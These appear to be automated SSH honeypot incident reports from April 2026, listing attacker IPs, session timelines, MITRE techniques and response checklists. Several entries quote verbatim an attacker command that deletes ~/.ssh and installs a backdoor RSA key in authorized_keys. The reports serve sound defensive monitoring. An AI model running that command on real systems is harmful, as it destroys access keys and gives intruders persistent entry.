### 🔴 HIGH · IR-e891b0a34b90

| Field | Detail |
|---|---|
| **Source IP** | `170.238.160[.]191` |
| **First Seen** | 2026-04-26 19:39 |
| **Last Seen** | 2026-04-26 19:39 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 19:39:25` | `cowrie.session.connect` |
| `2026-04-26 19:39:25` | `cowrie.client.version` |
| `2026-04-26 19:39:25` | `cowrie.client.kex` |
| `2026-04-26 19:39:26` | `cowrie.login.success` |
| `2026-04-26 19:39:27` | `cowrie.session.params` |
| `2026-04-26 19:39:27` | `cowrie.command.input` |
| `2026-04-26 19:39:27` | `cowrie.command.failed` |
| `2026-04-26 19:39:27` | `cowrie.log.closed` |
| `2026-04-26 19:39:28` | `cowrie.session.params` |
| `2026-04-26 19:39:28` | `cowrie.command.input` |
| `2026-04-26 19:39:28` | `cowrie.session.file_download` |
| `2026-04-26 19:39:28` | `cowrie.log.closed` |
| `2026-04-26 19:39:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.238.160[.]191` to AbuseIPDB if not already reported
- [ ] Block `170.238.160[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-013c2c5de55f

| Field | Detail |
|---|---|
| **Source IP** | `170.238.160[.]191` |
| **First Seen** | 2026-04-26 19:39 |
| **Last Seen** | 2026-04-26 19:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 19:39:32` | `cowrie.session.connect` |
| `2026-04-26 19:39:32` | `cowrie.client.version` |
| `2026-04-26 19:39:32` | `cowrie.client.kex` |
| `2026-04-26 19:39:34` | `cowrie.login.success` |
| `2026-04-26 19:39:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.238.160[.]191` to AbuseIPDB if not already reported
- [ ] Block `170.238.160[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e084007b564d

| Field | Detail |
|---|---|
| **Source IP** | `170.238.160[.]191` |
| **First Seen** | 2026-04-26 19:40 |
| **Last Seen** | 2026-04-26 19:40 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 19:40:22` | `cowrie.session.connect` |
| `2026-04-26 19:40:22` | `cowrie.client.version` |
| `2026-04-26 19:40:23` | `cowrie.client.kex` |
| `2026-04-26 19:40:24` | `cowrie.login.success` |
| `2026-04-26 19:40:25` | `cowrie.session.params` |
| `2026-04-26 19:40:25` | `cowrie.command.input` |
| `2026-04-26 19:40:25` | `cowrie.command.failed` |
| `2026-04-26 19:40:25` | `cowrie.log.closed` |
| `2026-04-26 19:40:26` | `cowrie.session.params` |
| `2026-04-26 19:40:26` | `cowrie.command.input` |
| `2026-04-26 19:40:26` | `cowrie.session.file_download` |
| `2026-04-26 19:40:26` | `cowrie.log.closed` |
| `2026-04-26 19:40:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.238.160[.]191` to AbuseIPDB if not already reported
- [ ] Block `170.238.160[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a83e1f0735c

| Field | Detail |
|---|---|
| **Source IP** | `170.238.160[.]191` |
| **First Seen** | 2026-04-26 19:40 |
| **Last Seen** | 2026-04-26 19:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 19:40:29` | `cowrie.session.connect` |
| `2026-04-26 19:40:29` | `cowrie.client.version` |
| `2026-04-26 19:40:30` | `cowrie.client.kex` |
| `2026-04-26 19:40:31` | `cowrie.login.success` |
| `2026-04-26 19:40:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.238.160[.]191` to AbuseIPDB if not already reported
- [ ] Block `170.238.160[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b69f52a0dd6

| Field | Detail |
|---|---|
| **Source IP** | `170.238.160[.]191` |
| **First Seen** | 2026-04-26 19:41 |
| **Last Seen** | 2026-04-26 19:41 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 19:41:12` | `cowrie.session.connect` |
| `2026-04-26 19:41:12` | `cowrie.client.version` |
| `2026-04-26 19:41:13` | `cowrie.client.kex` |
| `2026-04-26 19:41:14` | `cowrie.login.success` |
| `2026-04-26 19:41:15` | `cowrie.session.params` |
| `2026-04-26 19:41:15` | `cowrie.command.input` |
| `2026-04-26 19:41:15` | `cowrie.command.failed` |
| `2026-04-26 19:41:15` | `cowrie.log.closed` |
| `2026-04-26 19:41:15` | `cowrie.session.params` |
| `2026-04-26 19:41:15` | `cowrie.command.input` |
| `2026-04-26 19:41:16` | `cowrie.session.file_download` |
| `2026-04-26 19:41:16` | `cowrie.log.closed` |
| `2026-04-26 19:41:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.238.160[.]191` to AbuseIPDB if not already reported
- [ ] Block `170.238.160[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd1bc66c22cd

| Field | Detail |
|---|---|
| **Source IP** | `170.238.160[.]191` |
| **First Seen** | 2026-04-26 19:41 |
| **Last Seen** | 2026-04-26 19:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 19:41:19` | `cowrie.session.connect` |
| `2026-04-26 19:41:19` | `cowrie.client.version` |
| `2026-04-26 19:41:20` | `cowrie.client.kex` |
| `2026-04-26 19:41:21` | `cowrie.login.success` |
| `2026-04-26 19:41:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.238.160[.]191` to AbuseIPDB if not already reported
- [ ] Block `170.238.160[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-600fd2dfa9a0

| Field | Detail |
|---|---|
| **Source IP** | `170.238.160[.]191` |
| **First Seen** | 2026-04-26 19:42 |
| **Last Seen** | 2026-04-26 19:42 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 19:42:05` | `cowrie.session.connect` |
| `2026-04-26 19:42:05` | `cowrie.client.version` |
| `2026-04-26 19:42:06` | `cowrie.client.kex` |
| `2026-04-26 19:42:07` | `cowrie.login.success` |
| `2026-04-26 19:42:08` | `cowrie.session.params` |
| `2026-04-26 19:42:08` | `cowrie.command.input` |
| `2026-04-26 19:42:08` | `cowrie.command.failed` |
| `2026-04-26 19:42:08` | `cowrie.log.closed` |
| `2026-04-26 19:42:09` | `cowrie.session.params` |
| `2026-04-26 19:42:09` | `cowrie.command.input` |
| `2026-04-26 19:42:09` | `cowrie.session.file_download` |
| `2026-04-26 19:42:09` | `cowrie.log.closed` |
| `2026-04-26 19:42:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.238.160[.]191` to AbuseIPDB if not already reported
- [ ] Block `170.238.160[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ef54c6a44fb

| Field | Detail |
|---|---|
| **Source IP** | `170.238.160[.]191` |
| **First Seen** | 2026-04-26 19:42 |
| **Last Seen** | 2026-04-26 19:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 19:42:13` | `cowrie.session.connect` |
| `2026-04-26 19:42:13` | `cowrie.client.version` |
| `2026-04-26 19:42:13` | `cowrie.client.kex` |
| `2026-04-26 19:42:14` | `cowrie.login.success` |
| `2026-04-26 19:42:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.238.160[.]191` to AbuseIPDB if not already reported
- [ ] Block `170.238.160[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7975254bdf33

| Field | Detail |
|---|---|
| **Source IP** | `170.238.160[.]191` |
| **First Seen** | 2026-04-26 19:42 |
| **Last Seen** | 2026-04-26 19:43 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 19:42:56` | `cowrie.session.connect` |
| `2026-04-26 19:42:56` | `cowrie.client.version` |
| `2026-04-26 19:42:57` | `cowrie.client.kex` |
| `2026-04-26 19:42:58` | `cowrie.login.success` |
| `2026-04-26 19:42:58` | `cowrie.session.params` |
| `2026-04-26 19:42:59` | `cowrie.command.input` |
| `2026-04-26 19:42:59` | `cowrie.command.failed` |
| `2026-04-26 19:42:59` | `cowrie.log.closed` |
| `2026-04-26 19:43:00` | `cowrie.session.params` |
| `2026-04-26 19:43:00` | `cowrie.command.input` |
| `2026-04-26 19:43:00` | `cowrie.session.file_download` |
| `2026-04-26 19:43:00` | `cowrie.log.closed` |
| `2026-04-26 19:43:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.238.160[.]191` to AbuseIPDB if not already reported
- [ ] Block `170.238.160[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-978600953da9

| Field | Detail |
|---|---|
| **Source IP** | `170.238.160[.]191` |
| **First Seen** | 2026-04-26 19:43 |
| **Last Seen** | 2026-04-26 19:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 19:43:03` | `cowrie.session.connect` |
| `2026-04-26 19:43:03` | `cowrie.client.version` |
| `2026-04-26 19:43:04` | `cowrie.client.kex` |
| `2026-04-26 19:43:05` | `cowrie.login.success` |
| `2026-04-26 19:43:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.238.160[.]191` to AbuseIPDB if not already reported
- [ ] Block `170.238.160[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20e6df9c3a38

| Field | Detail |
|---|---|
| **Source IP** | `170.238.160[.]191` |
| **First Seen** | 2026-04-26 19:43 |
| **Last Seen** | 2026-04-26 19:43 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 19:43:47` | `cowrie.session.connect` |
| `2026-04-26 19:43:47` | `cowrie.client.version` |
| `2026-04-26 19:43:48` | `cowrie.client.kex` |
| `2026-04-26 19:43:49` | `cowrie.login.success` |
| `2026-04-26 19:43:50` | `cowrie.session.params` |
| `2026-04-26 19:43:50` | `cowrie.command.input` |
| `2026-04-26 19:43:50` | `cowrie.command.failed` |
| `2026-04-26 19:43:50` | `cowrie.log.closed` |
| `2026-04-26 19:43:51` | `cowrie.session.params` |
| `2026-04-26 19:43:51` | `cowrie.command.input` |
| `2026-04-26 19:43:51` | `cowrie.session.file_download` |
| `2026-04-26 19:43:51` | `cowrie.log.closed` |
| `2026-04-26 19:43:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.238.160[.]191` to AbuseIPDB if not already reported
- [ ] Block `170.238.160[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92a5d896fcd2

| Field | Detail |
|---|---|
| **Source IP** | `170.238.160[.]191` |
| **First Seen** | 2026-04-26 19:43 |
| **Last Seen** | 2026-04-26 19:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 19:43:54` | `cowrie.session.connect` |
| `2026-04-26 19:43:54` | `cowrie.client.version` |
| `2026-04-26 19:43:55` | `cowrie.client.kex` |
| `2026-04-26 19:43:56` | `cowrie.login.success` |
| `2026-04-26 19:43:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.238.160[.]191` to AbuseIPDB if not already reported
- [ ] Block `170.238.160[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2275457141a5

| Field | Detail |
|---|---|
| **Source IP** | `182.66.193[.]212` |
| **First Seen** | 2026-04-26 19:44 |
| **Last Seen** | 2026-04-26 19:45 |
| **Session Duration** | 51s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 19:44:30` | `cowrie.session.connect` |
| `2026-04-26 19:44:30` | `cowrie.client.version` |
| `2026-04-26 19:44:30` | `cowrie.client.kex` |
| `2026-04-26 19:44:30` | `cowrie.login.success` |
| `2026-04-26 19:45:22` | `cowrie.session.file_upload` |
| `2026-04-26 19:45:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.66.193[.]212` to AbuseIPDB if not already reported
- [ ] Block `182.66.193[.]212` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b91bc117581a

| Field | Detail |
|---|---|
| **Source IP** | `170.238.160[.]191` |
| **First Seen** | 2026-04-26 19:44 |
| **Last Seen** | 2026-04-26 19:44 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 19:44:40` | `cowrie.session.connect` |
| `2026-04-26 19:44:40` | `cowrie.client.version` |
| `2026-04-26 19:44:40` | `cowrie.client.kex` |
| `2026-04-26 19:44:42` | `cowrie.login.success` |
| `2026-04-26 19:44:42` | `cowrie.session.params` |
| `2026-04-26 19:44:42` | `cowrie.command.input` |
| `2026-04-26 19:44:42` | `cowrie.command.failed` |
| `2026-04-26 19:44:43` | `cowrie.log.closed` |
| `2026-04-26 19:44:43` | `cowrie.session.params` |
| `2026-04-26 19:44:43` | `cowrie.command.input` |
| `2026-04-26 19:44:44` | `cowrie.session.file_download` |
| `2026-04-26 19:44:44` | `cowrie.log.closed` |
| `2026-04-26 19:44:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.238.160[.]191` to AbuseIPDB if not already reported
- [ ] Block `170.238.160[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82ed0fadb61e

| Field | Detail |
|---|---|
| **Source IP** | `170.238.160[.]191` |
| **First Seen** | 2026-04-26 19:44 |
| **Last Seen** | 2026-04-26 19:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 19:44:47` | `cowrie.session.connect` |
| `2026-04-26 19:44:47` | `cowrie.client.version` |
| `2026-04-26 19:44:48` | `cowrie.client.kex` |
| `2026-04-26 19:44:49` | `cowrie.login.success` |
| `2026-04-26 19:44:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.238.160[.]191` to AbuseIPDB if not already reported
- [ ] Block `170.238.160[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d71c55f7520

| Field | Detail |
|---|---|
| **Source IP** | `170.238.160[.]191` |
| **First Seen** | 2026-04-26 19:45 |
| **Last Seen** | 2026-04-26 19:45 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 19:45:32` | `cowrie.session.connect` |
| `2026-04-26 19:45:32` | `cowrie.client.version` |
| `2026-04-26 19:45:33` | `cowrie.client.kex` |
| `2026-04-26 19:45:34` | `cowrie.login.success` |
| `2026-04-26 19:45:35` | `cowrie.session.params` |
| `2026-04-26 19:45:35` | `cowrie.command.input` |
| `2026-04-26 19:45:35` | `cowrie.command.failed` |
| `2026-04-26 19:45:35` | `cowrie.log.closed` |
| `2026-04-26 19:45:36` | `cowrie.session.params` |
| `2026-04-26 19:45:36` | `cowrie.command.input` |
| `2026-04-26 19:45:36` | `cowrie.session.file_download` |
| `2026-04-26 19:45:36` | `cowrie.log.closed` |
| `2026-04-26 19:45:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.238.160[.]191` to AbuseIPDB if not already reported
- [ ] Block `170.238.160[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa29d23d6427

| Field | Detail |
|---|---|
| **Source IP** | `170.238.160[.]191` |
| **First Seen** | 2026-04-26 19:45 |
| **Last Seen** | 2026-04-26 19:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 19:45:40` | `cowrie.session.connect` |
| `2026-04-26 19:45:40` | `cowrie.client.version` |
| `2026-04-26 19:45:40` | `cowrie.client.kex` |
| `2026-04-26 19:45:41` | `cowrie.login.success` |
| `2026-04-26 19:45:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.238.160[.]191` to AbuseIPDB if not already reported
- [ ] Block `170.238.160[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85322b0aa0c2

| Field | Detail |
|---|---|
| **Source IP** | `170.238.160[.]191` |
| **First Seen** | 2026-04-26 19:46 |
| **Last Seen** | 2026-04-26 19:46 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
